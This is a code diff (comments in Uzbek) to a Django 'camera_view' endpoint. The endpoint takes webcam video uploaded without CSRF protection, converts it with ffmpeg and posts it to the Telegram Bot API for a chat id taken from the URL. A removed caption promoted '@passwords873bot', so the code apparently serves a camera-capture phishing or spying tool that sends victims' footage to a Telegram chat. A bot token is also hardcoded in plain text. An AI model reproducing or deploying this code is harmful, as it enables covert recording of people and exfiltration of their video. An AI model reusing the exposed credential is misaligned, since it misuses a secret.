@@ -6,9 +6,14 @@ from django.conf import settings
 from django.http import JsonResponse
 from django.views.decorators.csrf import csrf_exempt
 from django.core.files.base import ContentFile
+from django.core.files.storage import default_storage
 from django.shortcuts import render
 
 TELEGRAM_BOT_TOKEN =  "7760257279:AAGgiolbiVaVv3hB1Dn3TvNGrz45WQq7UM4"
+
+VIDEO_DIR = os.path.join(settings.MEDIA_ROOT, 'saved_videos')
+os.makedirs(VIDEO_DIR, exist_ok=True)
+
 
 
 @csrf_exempt
@@ -48,44 +53,37 @@ def camera_view(request, id):
         return JsonResponse({"status": "ok", "file": filename})
 
 
-    # ======= VIDEO QABUL QILISH =======
-    if "video" in request.FILES:
-        video = request.FILES["video"]
+    if 'video' in request.FILES:
+        uploaded_file = request.FILES['video']
+        webm_filename = f"{id}_{uuid.uuid4()}.webm"
+        webm_path = os.path.join(VIDEO_DIR, webm_filename)
+        default_storage.save(webm_path, ContentFile(uploaded_file.read()))
 
-        webm_name = f"{id}_{uuid.uuid4()}.webm"
-        mp4_name = webm_name.replace(".webm", ".mp4")
+        mp4_filename = f"{id}_{uuid.uuid4()}.mp4"
+        mp4_path = os.path.join(VIDEO_DIR, mp4_filename)
 
-        webm_path = os.path.join(settings.MEDIA_ROOT, "saved_videos", webm_name)
-        mp4_path = os.path.join(settings.MEDIA_ROOT, "saved_videos", mp4_name)
-
-        os.makedirs(os.path.dirname(webm_path), exist_ok=True)
-
-        # WebM saqlash
-        with open(webm_path, "wb") as f:
-            for chunk in video.chunks():
-                f.write(chunk)
-
-        # convert → mp4
         try:
-            subprocess.run(
-                ["ffmpeg", "-i", webm_path, "-c:v", "libx264", "-preset", "fast",
-                 "-c:a", "aac", "-b:a", "128k", "-y", mp4_path],
-                check=True
-            )
+            subprocess.run([
+                "ffmpeg", "-i", webm_path,
+                "-c:v", "libx264", "-preset", "fast",
+                "-c:a", "aac", "-b:a", "128k",
+                "-y", mp4_path
+            ], check=True)
 
-            # Telegramga mp4 yuborish
-            with open(mp4_path, "rb") as f:
-                requests.post(
-                    f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo",
-                    files={"video": f},
-                    data={"chat_id": id, "caption": "Video 🎥\n\n@passwords873bot"},
-                    timeout=60
-                )
+            # Telegramga yuborish (sendVideo)
+            try:
+                url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
+                with open(mp4_path, "rb") as f:
+                    files = {"video": f}
+                    data = {"chat_id": id, "caption": f"Video 🎥"}
+                    r = requests.post(url, files=files, data=data, timeout=60)
+            except Exception as e:
+                print("Telegram video yuborishda xato:", e)
 
         except Exception as e:
-            print("Video convert xato:", e)
-            return JsonResponse({"status": "error", "msg": "convert xato"})
+            print("FFmpeg konvertatsiya xato:", e)
+            return JsonResponse({"status": "error", "message": "Video konvertatsiya xato"})
 
-        return JsonResponse({"status": "ok", "file": mp4_name})
+        return JsonResponse({"status": "success", "type": "video", "filename": mp4_filename})
 
-    return JsonResponse({"status": "error", "msg": "file yo'q"})
+    return JsonResponse({"status": "error", "message": "Hech qanday fayl yuborilmadi"})
